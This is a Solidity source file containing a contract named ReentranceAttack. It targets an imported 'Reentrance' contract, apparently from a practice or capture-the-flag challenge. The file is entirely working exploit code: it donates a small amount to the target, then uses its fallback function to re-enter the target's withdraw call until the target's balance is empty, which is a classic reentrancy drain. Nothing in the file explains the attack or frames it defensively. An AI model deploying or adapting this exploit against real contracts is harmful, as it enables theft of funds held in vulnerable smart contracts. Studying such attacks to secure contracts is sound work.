//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./reentrance.sol";

contract ReentranceAttack {
    Reentrance public _target;
    uint public amount = 0.001 ether;

    constructor(address payable _targetAdr) public payable {
        _target = Reentrance(_targetAdr);
    }

    function donateToTarget() public payable {
        _target.donate{value: amount}(address(this));
    }

    fallback() external payable {
        if (address(_target).balance != 0) {
            _target.withdraw(amount);
        }
    }
}
